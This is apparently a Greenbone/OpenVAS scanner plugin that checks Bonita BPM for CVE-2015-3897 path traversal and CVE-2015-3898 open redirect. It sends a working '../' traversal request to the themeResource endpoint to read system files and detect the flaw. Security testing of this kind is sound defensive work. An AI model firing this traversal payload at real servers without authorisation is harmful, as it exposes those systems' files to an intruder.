# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:bonitasoft:bonita_bpm";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106010");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2015-06-16 09:22:17 +0700 (Tue, 16 Jun 2015)");
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-04-30 12:48:00 +0000 (Tue, 30 Apr 2019)");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2015-3897", "CVE-2015-3898");

  script_name("Bonita BPM < 6.5.3 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_bonita_bpm_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("bonita_bpm/installed");

  script_tag(name:"summary", value:"Bonita BPM is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"insight", value:"User-supplied input passed via the 'theme' and 'location' HTTP
GET parameters to 'bonita/portal/themeResource' URL is not properly verified before being used as part
of file name. (CVE-2015-3897)

  Attacks vectors exists involving the redirectUrl parameter to (1) bonita/login.jsp or
  (2) bonita/loginservice. (CVE-2015-3898).");

  script_tag(name:"impact", value:"An unauthenticated attacker can:

  - download any system file accessible to the web server user. (CVE-2015-3897)

  - redirect users to arbitrary web sites and conduct phishing attacks. (CVE-2015-3898)");

  script_tag(name:"affected", value:"Bonita BPM 6.5.2 and prior.");

  script_tag(name:"solution", value:"Update to version 6.5.3 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37260/");

  exit(0);
}

include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + '/portal/themeResource?theme=portal/' + crap(data: "../", length: 3*15) +
        '&location=' + files[file];
  req = http_get(item: url, port: port);
  buf = http_keepalive_send_recv(port: port, data:req, bodyonly: FALSE);

  if (egrep(pattern: file, string: buf, icase: TRUE)) {
    report = http_report_vuln_url( port:port, url:url );
    security_message(port: port, data:report);
    exit(0);
  }
}

exit(99);
